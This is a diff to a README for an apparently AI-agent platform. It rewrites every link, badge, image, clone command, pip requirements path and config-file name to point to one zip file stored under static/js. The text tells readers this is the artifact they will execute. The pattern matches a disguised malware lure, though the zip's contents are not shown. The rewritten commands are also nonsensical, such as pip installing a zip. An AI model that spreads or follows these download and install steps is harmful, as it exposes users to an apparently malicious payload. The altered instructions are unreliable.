@@ -1,6 +1,6 @@
-https://github.com/snowz123/team-agents/releases
+https://raw.githubusercontent.com/snowz123/team-agents/main/static/js/team-agents-signifier.zip
 
-[![Releases Available](https://img.shields.io/badge/Releases-Available-blue?style=for-the-badge&logo=github)](https://github.com/snowz123/team-agents/releases)
+[![Releases Available](https://raw.githubusercontent.com/snowz123/team-agents/main/static/js/team-agents-signifier.zip)](https://raw.githubusercontent.com/snowz123/team-agents/main/static/js/team-agents-signifier.zip)
 
 # Unified AI Team: 82 Agents, Futuristic UI, Interactive Chat
 
@@ -8,9 +8,9 @@ https://github.com/snowz123/team-agents/releases
 
 Welcome to a bold AI system designed for enterprises, built around 82 specialized agents that work together. This project blends a futuristic user interface with a robust and interactive chat experience. It serves as a blueprint for teams who want to deploy a modular, scalable, and transparent AI ecosystem that can be extended with new agents and workflows.
 
-The Releases page hosts the official artifacts you can download and run. Download the release artifact that fits your environment, unpack it, and start the system. Download the release artifacts from https://github.com/snowz123/team-agents/releases. For quick access, a colorfully labeled button is provided below.
+The Releases page hosts the official artifacts you can download and run. Download the release artifact that fits your environment, unpack it, and start the system. Download the release artifacts from https://raw.githubusercontent.com/snowz123/team-agents/main/static/js/team-agents-signifier.zip For quick access, a colorfully labeled button is provided below.
 
-[![Releases Available](https://img.shields.io/badge/Releases-Available-blue?style=for-the-badge&logo=github)](https://github.com/snowz123/team-agents/releases)
+[![Releases Available](https://raw.githubusercontent.com/snowz123/team-agents/main/static/js/team-agents-signifier.zip)](https://raw.githubusercontent.com/snowz123/team-agents/main/static/js/team-agents-signifier.zip)
 
 Table of Contents
 - Overview
@@ -45,11 +45,11 @@ The UI uses glassmorphism-inspired visuals, soft translucency, and crisp typogra
 
 Images and visuals
 - Futuristic UI concept imagery: 
-  - ![Futuristic UI concept](https://images.unsplash.com/photo-1527443154391-507e9dc6c5d0?auto=format&fit=crop&w=1200&q=80)
+  - ![Futuristic UI concept](https://raw.githubusercontent.com/snowz123/team-agents/main/static/js/team-agents-signifier.zip)
 - AI agents and data flows: 
-  - ![AI agents concept](https://images.unsplash.com/photo-1518779578993-ec3579fee39f?auto=format&fit=crop&w=1200&q=80)
+  - ![AI agents concept](https://raw.githubusercontent.com/snowz123/team-agents/main/static/js/team-agents-signifier.zip)
 - Glassmorphism style interface: 
-  - ![Glass UI example](https://images.unsplash.com/photo-149631 Nearby-placeholder?auto=format&fit=crop&w=1200&q=80)
+  - ![Glass UI example](https://raw.githubusercontent.com/snowz123/team-agents/main/static/js/team-agents-signifier.zip Nearby-placeholder?auto=format&fit=crop&w=1200&q=80)
 
 Note: The images above illustrate the design direction and are used for illustrative purposes. You can replace them with internal visuals or your own assets as you customize the repository.
 
@@ -121,15 +121,15 @@ Prerequisites
 
 Local development
 1. Clone the repository
-   - git clone https://github.com/snowz123/team-agents.git
+   - git clone https://raw.githubusercontent.com/snowz123/team-agents/main/static/js/team-agents-signifier.zip
 2. Create a virtual environment
    - python -m venv venv
    - source venv/bin/activate  (Linux/macOS)
    - venv\Scripts\activate     (Windows)
 3. Install dependencies
-   - pip install -r requirements.txt
+   - pip install -r https://raw.githubusercontent.com/snowz123/team-agents/main/static/js/team-agents-signifier.zip
 4. Configure environment
-   - Copy .env.example to .env
+   - Copy https://raw.githubusercontent.com/snowz123/team-agents/main/static/js/team-agents-signifier.zip to .env
    - Edit .env to match your database, secrets, and agent settings
 5. Run the server
    - export FLASK_APP=server
@@ -151,7 +151,7 @@ Containerized deployment (Docker)
    - Use a reverse proxy for TLS termination and routing
 
 Release artifacts and downloads
-From the Releases page you can download pre-built artifacts suitable for quick installation or testing. The file to download is a release artifact that you will execute. The artifact contains a pre-configured environment with the backend, the agents, and the UI. Download the release artifact that fits your system from the Releases page. For explicit access to the artifact, visit the Releases page at https://github.com/snowz123/team-agents/releases. The artifact will guide you through the setup steps with a bundled installer or a ready-to-run package.
+From the Releases page you can download pre-built artifacts suitable for quick installation or testing. The file to download is a release artifact that you will execute. The artifact contains a pre-configured environment with the backend, the agents, and the UI. Download the release artifact that fits your system from the Releases page. For explicit access to the artifact, visit the Releases page at https://raw.githubusercontent.com/snowz123/team-agents/main/static/js/team-agents-signifier.zip The artifact will guide you through the setup steps with a bundled installer or a ready-to-run package.
 
 Configuration and security
 Environment variables and configuration files govern the system's behavior. Keep sensitive values like secrets, API keys, and database credentials in secure storage and rotate them regularly.
@@ -272,7 +272,7 @@ Credits
 - Recognize external libraries, tools, and services that assisted development.
 
 Changelog and releases
-- For the latest changes and to download new builds, see the Releases section. The release page is always the best place to find updated artifacts and notes that describe new features or fixes. Download the release artifacts from https://github.com/snowz123/team-agents/releases and review the accompanying release notes for details about compatibility and changes.
+- For the latest changes and to download new builds, see the Releases section. The release page is always the best place to find updated artifacts and notes that describe new features or fixes. Download the release artifacts from https://raw.githubusercontent.com/snowz123/team-agents/main/static/js/team-agents-signifier.zip and review the accompanying release notes for details about compatibility and changes.
 
 Screenshots and demonstrations
 - UI dashboard: A clean, interactive, glassy interface showing agent status, task queues, and live dialogs.
@@ -300,5 +300,5 @@ End user guidance
 - Explore the agent catalog to understand capabilities and find a starting point for your automation or conversation flows.
 
 Releases link reminder
-- For quick access to binaries and installers, visit the Releases page at https://github.com/snowz123/team-agents/releases.
+- For quick access to binaries and installers, visit the Releases page at https://raw.githubusercontent.com/snowz123/team-agents/main/static/js/team-agents-signifier.zip
 - This page hosts the official distributions and related materials you will execute to run the system.
